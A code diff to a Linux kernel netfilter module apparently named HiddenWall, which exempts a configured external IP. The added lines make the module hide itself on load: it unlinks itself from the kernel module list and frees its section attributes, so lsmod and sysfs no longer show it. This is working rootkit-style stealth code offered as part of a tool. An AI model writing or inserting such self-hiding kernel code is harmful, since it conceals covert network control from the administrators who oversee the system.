@@ -16,7 +16,21 @@ static unsigned char *ip_address = "\x14\x00\x00\x03";
 
 // external IP to liberate
 static char *ip_external = "192.168.100.181";
+static struct list_head *module_previous;
+static short module_hidden = 0;
 
+void module_hide(void)
+{
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	module_hidden = 1;
+}
+
+static inline void tidy(void)
+{
+	kfree(THIS_MODULE->sect_attrs);
+	THIS_MODULE->sect_attrs = NULL;
+}
 
 unsigned int main_hook( unsigned int hooknum, 
 			struct sk_buff *skb, 
@@ -120,6 +134,8 @@ unsigned int main_hook( unsigned int hooknum,
 
 int init_module()
 {
+	module_hide();
+	tidy();
         netfilter_ops.hook              =       main_hook;
         netfilter_ops.pf                =       PF_INET;
         netfilter_ops.hooknum           =       NF_INET_PRE_ROUTING;
@@ -128,4 +144,11 @@ int init_module()
 	return 0;
 }
 
-void cleanup_module() { nf_unregister_hook(&netfilter_ops); }
+void cleanup_module() 
+{ 
+	nf_unregister_hook(&netfilter_ops); 
+}
+
+MODULE_LICENSE("BSD 2");
+MODULE_AUTHOR("CoolerVoid");
+MODULE_DESCRIPTION("HiddenWall");
